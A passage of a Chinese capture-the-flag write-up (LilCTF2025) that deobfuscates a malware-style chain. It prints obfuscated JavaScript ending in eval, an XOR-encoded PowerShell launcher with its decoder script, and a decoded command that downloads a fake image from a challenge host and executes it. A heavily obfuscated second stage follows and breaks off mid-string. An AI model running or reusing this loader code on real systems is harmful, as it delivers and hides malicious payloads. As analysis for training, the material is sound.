i,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,zN,Fi,ff,RV,xv,zN,NW,ff,RV,xv,zN,Fi,ff,RV,xv,zN,FT,ff,RV,FT,it,zN,ff,RV,xv,NW,QB,ff,RV,FT,it,xv,ff,RV,xv,zN,Fi,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,FT,it,NW,ff,RV,xv,yN,yN,ff,RV,xv,yN,Mb,ff,RV,xv,yN,yN,ff,RV,FT,it,zN,ff,RV,xv,yN,yN,ff,RV,xv,kX,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,NW,ff,RV,xv,kX,Mb,ff,RV,FT,QB,NW,ff,RV,xv,kX,zN,ff,RV,xv,zN,QB,ff,RV,xv,kX,it,ff,RV,xv,xv,Mb,ff,RV,FT,QB,it,ff,RV,FT,QB,QB,ff,RV,FT,QB,kX,ff,RV,FT,Fi,it,ff,RV,FT,QB,NW,ff,RV,FT,QB,FT,ff,RV,xv,kX,zN,ff,RV,xv,NW,kX,ff,RV,xv,NW,kX,ff,RV,xv,Mb,NW,ff,RV,FT,QB,it,ff,RV,xv,xv,FT,ff,RV,FT,it,it,ff,RV,FT,QB,FT,ff,RV,FT,Fi,it,ff,RV,xv,zN,QB,ff,RV,xv,yN,FT,ff,RV,xv,kX,xv,ff,RV,xv,zN,FT,ff,RV,xv,Mb,FT,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,kX,ff,RV,FT,QB,Mb,ff,RV,FT,Fi,it,ff,RV,xv,zN,NW,ff,RV,xv,NW,Fi,ff,RV,xv,NW,NW,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,xv,kX,kX,ff,RV,FT,it,QB,ff,RV,FT,QB,it,ff,RV,FT,QB,NW,ff,RV,xv,yN,yN,ff,RV,xv,zN,Fi,ff,RV,xv,NW,QB,ff,RV,xv,zN,kX,ff,RV,xv,NW,yN,ff,RV,xv,zN,Fi,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,FT,it,xv,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,Fi,FT,ff,RV,FT,QB,it,ff,RV,FT,Fi,xv,ff,RV,FT,QB,QB,ff,RV,xv,yN,yN,ff,RV,xv,zN,Fi,ff,RV,xv,zN,Fi,ff,RV,xv,xv,Fi,ff,RV,xv,yN,kX,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,zN,FT,ff,RV,xv,Mb,zN,ff,RV,FT,QB,Mb,ff,RV,xv,kX,kX,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,QB,QB,ff,RV,FT,Fi,zN,ff,RV,xv,zN,QB,ff,RV,xv,zN,kX,ff,RV,xv,zN,NW,ff,RV,xv,NW,it,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,zN,FT,ff,RV,xv,Mb,zN,ff,RV,FT,QB,Mb,ff,RV,xv,kX,kX,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,QB,QB,ff,RV,FT,Fi,zN,ff,RV,xv,zN,QB,ff,RV,xv,NW,it,ff,RV,xv,zN,it,tg,QF,Im,nd,Ge,sV,RV,Gm,YZ,Xj,kF,RV,ST,RV,pV,wt,wV,Rp,kz,CX,GH,US,xv,Mb,Mb,ff,xv,Mb,zN,ff,FT,Fi,Fi,ff,FT,QB,NW,ff,FT,Fi,xv,ff,FT,QB,yN,ff,FT,QB,FT,ff,xv,zN,FT,ff,xv,Mb,zN,ff,FT,Fi,NW,ff,FT,Fi,it,ff,FT,Fi,kX,ff,FT,Fi,kX,tg,QF,Im,nd,Ge,sV,RV,pV,wt,wV,Rp,kz,CX,RV,ST,RV,tV,Gm,Wn,RV,sC,Fx,nI,pV,nd,Gm,Yp,FF,uS,Rp,Gm,Fx,nI,GH,Gm,YZ,Xj,kF,QF,Im,pV,wt,wV,Rp,kz,CX,cX,wV,UP,tV,GH,wt,wl,NL,Ep,uS,Lj,ff,RV,Fi,ff,RV,nI,sV,UP,Gm,QF,Im);eval(SxhM); window.close();</script>
```

直接复制到浏览器得到第一条执行的powershell命令，进行了异或加密，204的十六进制是0xCC

![](https://assets.bili33.top/img/LilCTF2025-Writeup/de08a234-b7b9-46b2-a778-99c1426149c3.png)

![](https://assets.bili33.top/img/LilCTF2025-Writeup/877706f8-a404-4988-8c59-c38a798b7295.png)

```cmd
powershell.exe -w 1 -ep Unrestricted -nop $EFTE =([regex]::Matches('a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fdfdfafae3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7','.{2}') | % { [char]([Convert]::ToByte($_.Value,16) -bxor '204') }) -join '';& $EFTE.Substring(0,3) $EFTE.Substring(3)
```

解码python脚本

```python
def decrypt_powershell_command(hex_string, xor_key=0xCC):
    """
    解密PowerShell的十六进制混淆命令
    :param hex_string: 十六进制混淆字符串
    :param xor_key: 异或密钥 (0xCC)
    :return: 解密后的可读命令
    """
    # 每2个字符分割（一个字节）
    hex_bytes = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
    
    # 将十六进制转换为字节并应用异或
    decoded_chars = []
    for byte in hex_bytes:
        # 十六进制转整数
        value = int(byte, 16)
        # 异或解密
        decrypted = value ^ xor_key
        # 转换为字符
        decoded_chars.append(chr(decrypted))
    
    # 组合成完整字符串
    return ''.join(decoded_chars)

# 提供的混淆字符串（缩短版，实际使用完整字符串）
obfuscated_hex = "a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fdfdfafae3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7"
# 解密命令
decrypted_command = decrypt_powershell_command(obfuscated_hex)

# 输出结果
print("解密后的完整命令:")
print(decrypted_command)
print("\n命令结构分析:")
print(f"主命令: {decrypted_command[:3]}")
print(f"命令参数: {decrypted_command[3:]}")
```

解密后得到:

```powershell
iexStart-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList '-w','h','-ep','Unrestricted','-Command',"Set-Variable 3 'http://challenge.xinshi.fun:41166/bestudding.jpg';SI Variable:/Z4D 'Net.WebClient';cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where{(GV _).Value.Name-clike'*dName'}).Name).Invoke('Ne*ct',1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where{(GV _).Value.Name-clike'*wn*d*g'}).Name);&([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))";
```

等价于

```powershell
$url = 'http://host:port/bestudding.jpg'
$webClient = New-Object Net.WebClient
$scriptContent = $webClient.DownloadString($url)
Invoke-Expression $scriptContent
```

把这个bestudding.jpg下载下来

用winhex打开

```cmd
('('  | % { $r = + $() } { $u = $r } { $b = ++  $r } { $q = (  $r = $r + $b  ) } { $z = (  $r = $r + $b  ) } { $o = ($r = $r + $b  ) } { $d = ($r = $r + $b  ) } { $h = ($r = $r + $b  ) } { $e = ($r = $r + $b  ) } { $i = ($r = $r + $b  ) } { $x = ($q *( $z) ) } { $l = ($r = $r + $b) } { $g = "[" + "$(@{  })"[$e  ] + "$(@{  })"[  "$b$l"  ] + "$(@{  }  )  "[  "$q$u"  ] + "$?"[$b  ] + "]" } { $r = "".("$(  @{}  )  "[  "$b$o"  ] + "$(@{})  "[  "$b$h"] + "$(  @{  }  )"[$u] + "$(@{}  )"[$o] + "$?  "[  $b] + "$(  @{})"[$z  ]) } { $r = "$(@{  }  )"[  "$b" + "$o"] + "$(@{  })  "[$o  ] + "$r"["$q" + "$e"  ] }  )  ;  " $r  ($g$z$x+$g$x$i+$g$b$u$b+$g$l$i+$g$b$b$e+$g$b$u$z+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$x$l+$g$b$b$o+$g$b$b$o+$g$b$b$b+$g$b$b$o+$g$x$d+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$x+$g$b$u$b+$g$b$b$o+$g$l$i+$g$b$b$b+$g$b$b$d+$g$b$u$b+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$e+$g$l$e+$g$b$b$o+$g$b$b$u+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$i$u+$g$b$b$o+$g$b$u$b+$g$b$u$q+$g$b$u$b+$g$b$b$o+$g$b$u$b+$g$b$b$u+$g$l$l+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$z+$g$b$u$d+$g$b$u$i+$g$b$u$b+$g$b$b$u+$g$b$b$x+$g$b$u$i+$g$b$q$b+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$b$u$d+$g$b$b$u+$g$b$b$e+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$l$b+$g$b$b$i+$g$b$b$b+$g$b$u$d+$g$b$u$u+$g$l$z+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$q+$g$b$u$b+$g$b$u$q+$g$b$u$i+$g$b$u$b+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$x+$g$x$d+$g$b$b$d+$g$b$b$d+$g$b$u$b+$g$b$u$l+$g$l$i+$g$b$u$i+$g$b$q$b+$g$l$z+$g$d$i+$g$d$i+$g$e$x+$g$b$b$b+$g$l$e+$g$b$u$u+$g$i$e+$g$b$u$d+$g$b$b$x+$g$b$u$o+$g$i$u+$g$l$e+$g$b$b$o+$g$b$b$x+$g$b$u$d+$g$l$e+$g$b$u$i+$g$e$i+$g$l$e+$g$b$u$l+$g$b$u$b+$g$o$u+$g$z$o+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$z$o+$g$o$b+$g$b$z+$g$b$u+$g$l$b+$g$b$b$i+$g$b$b$b+$g$b$u$d+$g$b$u$u+$g$l$z+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$q+$g$b$u$b+$g$b$u$q+$g$b$u$i+$g$b$u$b+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$x+$g$x$d+$g$b$b$d+$g$b$b$d+$g$b$u$b+$g$b$u$l+$g$l$i+$g$b$u$i+$g$b$q$b+$g$l$z+$g$d$i+$g$d$i+$g$e$x+$g$b$b$b+$g$l$e+$g$b$u$u+$g$i$e+$g$b$u$d+$g$b$b$x+$g$b$u$o+$g$i$u+$g$l$e+$g$b$b$o+$g$b$b$x+$g$b$u$d+$g$l$e+$g$b$u$i+$g$e$i+$g$l$e+$g$b$u$l+$g$b$u$b+$g$o$u+$g$z$o+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$z$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$b$d+$g$b$u$o+$g$b$b$e+$g$b$b$x+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$u+$g$z$q+$g$o$e+$g$b$b$d+$g$z$q+$g$o$e+$g$b$b$x+$g$z$q+$g$d$o+$g$o$i+$g$o$i+$g$z$q+$g$x$q+$g$z$x+$g$e$i+$g$b$b$e+$g$b$u$i+$g$b$u$i+$g$z$q+$g$d$u+$g$x$q+$g$z$i+$g$o$l+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$x$e+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$u$i+$g$b$b$b+$g$x$d$z$e$o+$g$o$u+$g$i$e$z$x+$g$b$i$z+$g$l$x$l+$g$x$u+$g$z$q+$g$o$b+$g$i$l$e$i+$g$l$e$z$z+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$b$x+$g$l$e+$g$b$b$o+$g$b$b$x+$g$i$u+$g$b$b$b+$g$b$b$d+$g$b$u$d+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$e+$g$l$e+$g$b$b$u+$g$b$b$e+$g$l$e+$g$b$u$i+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$q+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$b$u$d+$g$b$b$u+$g$b$u$d+$g$b$u$l+$g$l$e+$g$b$u$i+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$l$e+$g$b$q$u+$g$b$u$d+$g$b$u$l+$g$l$e+$g$b$u$i+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$o$u+$g$d$d+$g$d$u+$g$o$i+$g$o$o+$g$z$q+$g$d$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$x$x+$g$b$b$b+$g$b$b$o+$g$b$u$u+$g$b$u$b+$g$b$b$o+$g$i$z+$g$b$b$x+$g$b$q$b+$g$b$u$i+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$u+$g$b$u$d+$g$b$q$u+$g$b$u$b+$g$b$u$u+$g$x$i+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$b$b+$g$b$u$z+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$x+$g$l$e+$g$l$l+$g$b$u$e+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$z$d+$g$o$i+$g$o$i+$g$d$d+$g$d$d+$g$x$e+$g$x$e+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$l$e+$g$b$q$u+$g$b$u$d+$g$b$u$l+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$e$u+$g$l$e+$g$b$u$i+$g$b$b$d+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$o+$g$b$b$b+$g$b$b$q+$g$e$e+$g$b$b$b+$g$b$b$d+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$b$u$q+$g$e$u+$g$o$l+$g$e$z+$g$x$d+$g$d$q+$g$d$e+$g$e$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$x+$g$e$z+$g$e$x+$g$x$e+$g$i$o+$g$e$u+$g$b$q$z+$g$d$o+$g$b$u$b+$g$l$d+$g$i$x+$g$o$l+$g$e$b+$g$b$u$i+$g$e$x+$g$d$q+$g$e$i+$g$d$d+$g$l$d+$g$d$q+$g$d$e+$g$x$o+$g$o$l+$g$e$i+$g$z$x+$g$b$b$x+$g$